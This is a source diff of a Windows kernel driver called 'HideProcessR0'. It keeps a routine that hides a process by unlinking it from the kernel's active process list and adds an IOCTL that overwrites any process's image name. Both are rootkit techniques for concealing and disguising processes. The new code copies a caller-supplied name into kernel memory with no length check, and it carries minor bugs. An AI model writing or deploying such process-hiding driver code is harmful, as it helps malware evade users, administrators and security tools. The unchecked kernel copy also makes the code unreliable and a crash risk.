@@ -1,16 +1,4 @@
-#include <ntddk.h>
-
-#define DEVICE_NAME L"\\Device\\HideProcessR0"
-#define SYMBOL_NAME L"\\??\\HideProcessR0"
-#define WIN10_21H1_EPROCESS_TO_ACTIVEPROCESSLINKS_OFFSET 0x448
-#define IOCTL_HIDE_BY_PID \
-    CTL_CODE(FILE_DEVICE_UNKNOWN, 0x6666, METHOD_BUFFERED, FILE_ANY_ACCESS)
-
-#define kprintf(...) \
-    KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, __VA_ARGS__))
-
-NTSTATUS CustomControl(PDEVICE_OBJECT, PIRP);
-NTSTATUS CustomCreate(PDEVICE_OBJECT, PIRP);
+#include "header.h"
 
 VOID DriverUnload(PDRIVER_OBJECT pDriver)
 {
@@ -91,14 +79,46 @@ NTSTATUS HideProcessByPid(UINT64 pid)
             ((PLIST_ENTRY64)pCurNode->Blink)->Flink = pCurNode->Flink;
             ((PLIST_ENTRY64)pCurNode->Flink)->Blink = pCurNode->Blink;
 
-            goto success;
+            return STATUS_SUCCESS;
         }
     }
 
     return STATUS_UNSUCCESSFUL;
+}
 
-success:
-    return STATUS_SUCCESS;
+NTSTATUS SetImageName(PSET_IMAGE_NAME pSetImageName)
+{
+    PEPROCESS     pEprocess, pCurProcess;
+    PUCHAR        pOldImageName;
+    SIZE_T        len;
+    PLIST_ENTRY64 pActiveProcessLinks;
+    PLIST_ENTRY64 pCurNode;
+    UINT64        uProcessId;
+
+    pEprocess = PsGetCurrentProcess();
+    len = strlen(pSetImageName->bImageName);
+    pActiveProcessLinks =
+        ((PCHAR)pEprocess + WIN10_21H1_EPROCESS_TO_ACTIVEPROCESSLINKS_OFFSET);
+
+    for (PLIST_ENTRY64 pBeginNode = pActiveProcessLinks, pCurNode = pBeginNode;
+         pCurNode->Flink != pBeginNode;
+         pCurNode = pCurNode->Flink) {
+        pCurProcess =
+            (PEPROCESS)((PCHAR)pCurNode -
+                        WIN10_21H1_EPROCESS_TO_ACTIVEPROCESSLINKS_OFFSET);
+        uProcessId = PsGetProcessId(pCurProcess);
+        if (uProcessId == pSetImageName->pid) {
+            // copy new string to cover the old string
+
+            kprintf("[+ Hide Process R0] found the process pid\r\n", uProcessId);
+            pOldImageName = PsGetProcessImageFileName(pCurProcess);
+            RtlCopyMemory(pOldImageName, pSetImageName->bImageName, len);
+
+            return STATUS_SUCCESS;
+        }
+    }
+
+    return STATUS_UNSUCCESSFUL;
 }
 
 NTSTATUS CustomControl(PDEVICE_OBJECT pDevice, PIRP pIrp)
@@ -106,6 +126,7 @@ NTSTATUS CustomControl(PDEVICE_OBJECT pDevice, PIRP pIrp)
     PIO_STACK_LOCATION pstack;
     UINT64             iocode, in_len, out_len, ioinfo, pid;
     NTSTATUS           status;
+    PSET_IMAGE_NAME    data;
 
     status  = STATUS_SUCCESS;
     pstack  = IoGetCurrentIrpStackLocation(pIrp);
@@ -120,6 +141,14 @@ NTSTATUS CustomControl(PDEVICE_OBJECT pDevice, PIRP pIrp)
         status = HideProcessByPid(pid);
         if (!NT_SUCCESS(status)) {
             kprintf("[! Hide Process R0] Hide Process failed.\r\n");
+        }
+        ioinfo = 0;
+        break;
+    case IOCTL_SET_IMAGE_NAME:
+        data   = (PSET_IMAGE_NAME)pIrp->AssociatedIrp.SystemBuffer;
+        status = SetImageName(data);
+        if (!NT_SUCCESS(status)) {
+            kprintf("Set iamge name to process %llx failed.\r\n", data->pid);
         }
         ioinfo = 0;
         break;
